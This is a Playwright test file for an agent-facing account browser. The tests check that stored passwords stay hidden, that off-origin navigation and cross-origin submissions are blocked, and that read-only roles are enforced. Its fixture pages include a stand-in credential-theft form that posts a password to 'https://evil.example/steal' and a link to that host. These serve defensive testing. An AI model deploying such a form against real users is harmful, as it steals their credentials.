import { afterEach, describe, expect, it } from 'vitest';
import { existsSync } from 'node:fs';
import { chromium, type Browser, type LaunchOptions, type Route } from 'playwright-core';
import { BusinessBrowser } from '../src/server/access-browser';
import { AccessError, type AccountSecret } from '../src/server/access-vault';
import type { AccountPage, BrowserAction } from '../src/shared/access';

const site: AccountSecret = { id: 'account_test', label: 'Supplier', origin: 'https://supplies.example', loginUrl: 'https://supplies.example/login', signupUrl: 'https://supplies.example/signup', resourceOrigins: [], username: 'office@paperclips.example', password: 'generated-test-password', mailboxId: 'mail_test', ownerIds: ['coo'], allowSignup: true, enabled: true, createdAt: '' };
let browser: BusinessBrowser;
const requests: Array<{ url: string; method: string; body: string }> = [];
const users = new Map<string, string>();
/** Real Chrome and real route policy, with its allowed requests fulfilled by an in-memory fixture. No network. */
let launched: LaunchOptions = {};
async function fixtureBrowser(options: LaunchOptions): Promise<Browser> {
  launched = options;
  const actual = await chromium.launch({ ...options, executablePath: process.env.CHROME_PATH ?? '/opt/google/chrome/chrome', channel: undefined });
  return new Proxy(actual, {
    get(target, key) {
      if (key === 'newContext') return async (settings: Parameters<Browser['newContext']>[0]) => {
        const context = await actual.newContext(settings);
        return new Proxy(context, {
          get(ctx, member) {
            if (member === 'route') return async (pattern: string, handler: (route: Route) => Promise<void>) => {
              await context.route(pattern, async route => {
                const wrapped = new Proxy(route, {
                  get(item, property) {
                    if (property === 'continue') return async () => {
                      const req = route.request(), url = new URL(req.url()), body = req.postData() ?? '';
                      requests.push({ url: req.url(), method: req.method(), body });
                      let html: string;
                      if (req.method() === 'POST') {
                        const form = new URLSearchParams(body), username = form.get('email') ?? '', password = form.get('password') ?? '';
                        if (url.pathname === '/signup') { users.set(username, password); html = '<h1>Account created. Check your email.</h1>'; }
                        else if (url.pathname === '/orders') html = '<h1>Order cancelled</h1>';
                        else if (url.pathname === '/track') html = 'ok';
                        else if (url.pathname === '/change') html = '<h1>Password changed</h1>';
                        else html = users.get(username) === password ? '<h1>Signed in</h1><p>Echoed password: ' + password + '</p>' : '<h1>Login failed</h1>';
                      } else if (url.pathname === '/verify') html = '<h1>Email verified</h1>';
                      else if (url.pathname === '/live') html = '<h1 id="socket">Socket: connecting</h1><script>const socket = new WebSocket("wss://supplies.example/feed"); const say = (what) => { document.getElementById("socket").textContent = "Socket: " + what; }; socket.onopen = () => { say("open"); socket.send("anything the page likes"); }; socket.onclose = (event) => say("closed " + (event.wasClean ? "by the browser" : "after trying to connect"));</script>';
                      else if (url.pathname === '/getform') html = '<form method="get" action="/result"><label>Password<input type="password" name="password"></label><button>Go</button></form>';
                      else if (url.pathname === '/result') html = '<h1>Result</h1>';
                      else if (url.pathname === '/away') html = '<a href="https://evil.example/elsewhere">Elsewhere</a>';
                      else if (url.pathname === '/orders') html = '<h1>Orders</h1><form method="post" action="/orders"><button>Cancel order</button></form><button id="beacon" onclick="fetch(\'/track\', { method: \'POST\', body: \'x\' }).catch(() => {})">Beacon</button>';
                      else if (url.pathname === '/change') html = '<form method="post" action="/change"><label>Current<input type="password" name="password"></label><label>New<input type="password" name="next"></label><button>Change</button></form>';
                      else if (url.pathname === '/malicious') html = '<form method="post" action="https://evil.example/steal"><label>Password<input type="password" name="password"></label><button>Continue</button></form>';
                      else html = '<h1>' + (url.pathname === '/signup' ? 'Create account' : 'Log in') + '</h1><form method="post" action="' + url.pathname + '"><label>Email<input type="email" name="email"></label><label>Password<input type="password" name="password"></label><button>Submit</button></form>';
                      await route.fulfill({ status: 200, contentType: 'text/html', body: '<!doctype html><html><body>' + html + '</body></html>' });
                    };
                    const value = Reflect.get(item, property, item);
                    return typeof value === 'function' ? value.bind(item) : value;
                  },
                });
                await handler(wrapped);
              });
            };
            const value = Reflect.get(ctx, member, ctx);
            return typeof value === 'function' ? value.bind(ctx) : value;
          },
        });
      };
      const value = Reflect.get(target, key, target);
      return typeof value === 'function' ? value.bind(target) : value;
    },
  });
}
function setup() { requests.length = 0; users.clear(); browser = new BusinessBrowser(async () => '93.184.215.14', fixtureBrowser); }
const run = (action: Omit<BrowserAction, 'accountId'>, actor = 'task1', write = true) => browser.run(site, site.username, actor, { accountId: site.id, ...action }, new AbortController().signal, { write });
const element = (page: AccountPage, label: string) => page.elements.find(item => item.label === label)!.id;
afterEach(async () => { await browser?.close(); });
describe.skipIf(!existsSync(process.env.CHROME_PATH ?? '/opt/google/chrome/chrome'))('account browser', () => {
  it('creates and verifies an account, then logs in with a saved password without returning it', async () => {
    setup();
    let page = await run({ action: 'signup' });
    page = await run({ action: 'fill', element: element(page, 'Email'), source: 'email' });
    page = await run({ action: 'fill', element: element(page, 'Password'), source: 'password' });
    expect(JSON.stringify(page)).not.toContain(site.password);
    page = await run({ action: 'click', element: element(page, 'Submit') });
    expect(page.text).toContain('Account created');
    expect(users.get(site.username)).toBe(site.password);
    expect((await run({ action: 'navigate', url: 'https://supplies.example/verify?token=fixture-only' })).text).toContain('Email verified');
    await run({ action: 'close' });
    page = await run({ action: 'login' });
    page = await run({ action: 'fill', element: element(page, 'Email'), source: 'username' });
    page = await run({ action: 'fill', element: element(page, 'Password'), source: 'password' });
    page = await run({ action: 'click', element: element(page, 'Submit') });
    expect(page.text).toContain('Signed in');
    expect(page.text).toContain('[redacted]');
    expect(JSON.stringify(page)).not.toContain(site.password);
    expect(requests.filter(req => req.method === 'POST')).toHaveLength(2);
  });
  it('refuses password fills into arbitrary fields, unauthorised navigation, and cross-origin form submissions', async () => {
    setup();
    let page = await run({ action: 'login' });
    await expect(run({ action: 'fill', element: element(page, 'Email'), source: 'password' })).rejects.toMatchObject({ status: 403 });
    await expect(run({ action: 'navigate', url: 'https://evil.example/login' })).rejects.toMatchObject({ status: 403 });
    page = await run({ action: 'navigate', url: 'https://supplies.example/malicious' });
    page = await run({ action: 'fill', element: element(page, 'Password'), source: 'password' });
    await run({ action: 'click', element: element(page, 'Continue') }).catch(() => {});
    expect(requests.some(req => req.url.startsWith('https://evil.example'))).toBe(false);
  });
  it('does not hand back a generated password that a form put in the address', async () => {
    setup();
    // Generated passwords end in "!", which a web form encodes and encodeURIComponent does not.
    const secret = 'S3cretGenerated_-x!aA7';
    const account = { ...site, password: secret };
    const go = (action: Omit<BrowserAction, 'accountId'>) => browser.run(account, site.username, 'task1', { accountId: site.id, ...action }, new AbortController().signal, { write: true });
    await go({ action: 'login' });
    let page = await go({ action: 'navigate', url: 'https://supplies.example/getform' });
    page = await go({ action: 'fill', element: element(page, 'Password'), source: 'password' });
    page = await go({ action: 'click', element: element(page, 'Go') });
    expect(page.url).toBe('https://supplies.example/result?password=[redacted]');
    expect(decodeURIComponent(JSON.stringify(page))).not.toContain(secret);
  });
  it('says so plainly when a click would leave the service, and can go back', async () => {
    setup();
    await run({ action: 'login' });
    const page = await run({ action: 'navigate', url: 'https://supplies.example/away' });
    await expect(run({ action: 'click', element: element(page, 'Elsewhere') })).rejects.toMatchObject({ status: 403, message: 'The page left the authorised origin.' });
    expect(requests.some(req => req.url.startsWith('https://evil.example'))).toBe(false);
    expect((await run({ action: 'login' })).url).toBe('https://supplies.example/login');
  });
  describe('for a role that may sign in and read, but not act', () => {
    const read = (action: Omit<BrowserAction, 'accountId'>) => run(action, 'task1', false);
    const posts = () => requests.filter(req => req.method === 'POST').map(req => new URL(req.url).pathname);
    const signIn = async () => {
      let page = await read({ action: 'login' });
      page = await read({ action: 'fill', element: element(page, 'Email'), source: 'username' });
      page = await read({ action: 'fill', element: element(page, 'Password'), source: 'password' });
      return read({ action: 'click', element: element(page, 'Submit') });
    };
    it('lets the sign-in through, then lets it read and blocks the form that would change something', async () => {
      setup(); users.set(site.username, site.password);
      const signedIn = await signIn();
      expect(signedIn.text).toContain('Signed in');
      expect(signedIn.notice).toContain('sign in and read');
      expect(posts()).toEqual(['/login']);
      const orders = await read({ action: 'navigate', url: 'https://supplies.example/orders' });
      expect(orders.text).toContain('Orders');
      await expect(read({ action: 'click', element: element(orders, 'Cancel order') })).rejects.toMatchObject({ status: 403, message: expect.stringContaining('nothing was sent') });
      expect(posts()).toEqual(['/login']);
      // It is back on the page it was on, and can carry on reading.
      expect((await read({ action: 'inspect' })).text).toContain('Orders');
    });
    it('counts a request a page sends for itself, and does not let it out', async () => {
      setup(); users.set(site.username, site.password);
      await signIn();
      const page = await read({ action: 'navigate', url: 'https://supplies.example/orders' });
      const after = await read({ action: 'click', element: element(page, 'Beacon') });
      const settled = after.notice.includes('blocked') ? after : await read({ action: 'inspect' });
      expect(settled.notice).toContain('1 request that could have changed something on the site was blocked');
      expect(posts()).toEqual(['/login']);
    });
    it('does not let a second submission through in the same session', async () => {
      setup();
      const failed = await signIn();
      expect(failed.text).toContain('Login failed');
      let page = await read({ action: 'navigate', url: 'https://supplies.example/login' });
      page = await read({ action: 'fill', element: element(page, 'Password'), source: 'password' });
      await expect(read({ action: 'click', element: element(page, 'Submit') })).rejects.toMatchObject({ status: 403, message: expect.stringContaining('once a session') });
      expect(posts()).toEqual(['/login']);
      await read({ action: 'close' });
      users.set(site.username, site.password);
      expect((await signIn()).text).toContain('Signed in');
    });
    it('does not spend the sign-in anywhere but the page the session opened on', async () => {
      setup();
      await read({ action: 'login' });
      // A sign-up form reached by address is not a sign-in, and neither is a form asking for a new password.
      let page = await read({ action: 'navigate', url: 'https://supplies.example/signup' });
      page = await read({ action: 'fill', element: element(page, 'Password'), source: 'password' });
      await expect(read({ action: 'click', element: element(page, 'Submit') })).rejects.toMatchObject({ status: 403 });
      expect(users.size).toBe(0);
      expect(posts()).toEqual([]);
    });
    it('does not take a form with a second password field for a sign-in', async () => {
      setup();
      const changing = { ...site, loginUrl: 'https://supplies.example/change' };
      const go = (action: Omit<BrowserAction, 'accountId'>) => browser.run(changing, site.username, 'task1', { accountId: site.id, ...action }, new AbortController().signal, { write: false });
      let page = await go({ action: 'login' });
      page = await go({ action: 'fill', element: element(page, 'Current'), source: 'password' });
      await expect(go({ action: 'click', element: element(page, 'Change') })).rejects.toMatchObject({ status: 403 });
      expect(posts()).toEqual([]);
    });
    it('lets a role allowed to create accounts submit the sign-up, once', async () => {
      setup();
      let page = await read({ action: 'signup' });
      page = await read({ action: 'fill', element: element(page, 'Email'), source: 'email' });
      page = await read({ action: 'fill', element: element(page, 'Password'), source: 'password' });
      page = await read({ action: 'click', element: element(page, 'Submit') });
      expect(page.text).toContain('Account created');
      expect(users.get(site.username)).toBe(site.password);
      expect((await read({ action: 'navigate', url: 'https://supplies.example/verify?token=fixture-only' })).text).toContain('Email verified');
      expect(posts()).toEqual(['/signup']);
    });
    it('closes the window as soon as the agent moves on', async () => {
      setup(); users.set(site.username, site.password);
      await signIn();
      const page = await read({ action: 'navigate', url: 'https://supplies.example/orders' });
      await expect(read({ action: 'click', element: element(page, 'Cancel order') })).rejects.toMatchObject({ status: 403 });
    });
    it('takes the limit on from the next step when the privilege goes, and off when it is given', async () => {
      setup(); users.set(site.username, site.password);
      await run({ action: 'login' });
      let page = await run({ action: 'navigate', url: 'https://supplies.example/orders' });
      await expect(read({ action: 'click', element: element(page, 'Cancel order') })).rejects.toMatchObject({ status: 403 });
      page = await read({ action: 'inspect' });
      expect((await run({ action: 'click', element: element(page, 'Cancel order') })).text).toContain('Order cancelled');
      expect(posts()).toEqual(['/orders']);
    });
  });
  it('leaves Ctrl-C to the server, whose shutdown closes the browsers', async () => {
    setup();
    await run({ action: 'login' });
    expect(launched).toMatchObject({ handleSIGINT: false, handleSIGTERM: false });
  });
  it('closes a socket a page opens before it connects, so nothing leaves by a way the request rules cannot see', async () => {
    setup();
    await run({ action: 'login' });
    let page = await run({ action: 'navigate', url: 'https://supplies.example/live' });
    for (let tries = 0; tries < 100 && page.text.includes('connecting'); tries++) {
      await new Promise(resolve => setTimeout(resolve, 100));
      page = await run({ action: 'inspect' });
    }
    // Closed in good order by the browser itself. Not opened, and not a connection that was tried and failed.
    expect(page.text).toContain('Socket: closed by the browser');
  });
  it('isolates task sessions, refuses unapproved sign-up and closes access on cancellation', async () => {
    setup();
    await expect(browser.run({ ...site, allowSignup: false }, site.username, 'task1', { accountId: site.id, action: 'signup' }, new AbortController().signal, { write: true })).rejects.toMatchObject({ status: 403 });
    await run({ action: 'login' });
    await expect(run({ action: 'inspect' }, 'task2')).rejects.toThrow(/Open the login/);
    const abort = new AbortController(); abort.abort();
    await expect(browser.run(site, site.username, 'task1', { accountId: site.id, action: 'inspect' }, abort.signal, { write: true })).rejects.toThrow(/cancelled/);
    await expect(run({ action: 'inspect' })).rejects.toThrow(/Open the login/);
  });
});

// These need no browser: they are about how one is started, and whether one is started at all.
describe('how the account browser is started', () => {
  const login = (starting: BusinessBrowser, account: AccountSecret = site) => starting.run(account, site.username, 'task1', { accountId: site.id, action: 'login' }, new AbortController().signal, { write: true });

  it('pins each host of the account to the address that was checked, and makes every other name unfindable', async () => {
    let options: LaunchOptions | undefined;
    const asked: string[] = [];
    const starting = new BusinessBrowser(
      async host => { asked.push(host); return host === 'supplies.example' ? '93.184.215.14' : '2606:2800:21f:cb07:6820:80da:af6b:8b2c'; },
      async given => { options = given; throw new Error('no browser is started in this test'); },
    );
    await expect(login(starting, { ...site, resourceOrigins: ['https://cdn.supplies-static.example'] })).rejects.toMatchObject({ status: 503 });
    // Each name is looked up once, by the check that refuses private addresses, and the browser is told the answer.
    // It cannot look the name up again and get a different one, and it cannot find any other name at all.
    expect(asked).toEqual(['supplies.example', 'cdn.supplies-static.example']);
    expect(options!.args).toContain('--host-resolver-rules=MAP supplies.example 93.184.215.14,MAP cdn.supplies-static.example [2606:2800:21f:cb07:6820:80da:af6b:8b2c],MAP * ~NOTFOUND');
    expect(options!.args).toEqual(expect.arrayContaining(['--no-proxy-server', '--disable-quic']));
    expect(options).toMatchObject({ headless: true, chromiumSandbox: true, handleSIGINT: false, handleSIGTERM: false });
  });

  it('starts no browser for an account whose host is not at a public address', async () => {
    let started = 0;
    const refusing = new BusinessBrowser(
      async () => { throw new AccessError('Business connections cannot reach private or reserved network addresses.', 403); },
      async () => { started += 1; throw new Error('should not be reached'); },
    );
    await expect(login(refusing)).rejects.toMatchObject({ status: 403, message: expect.stringMatching(/private or reserved/) });
    expect(started).toBe(0);
  });
});
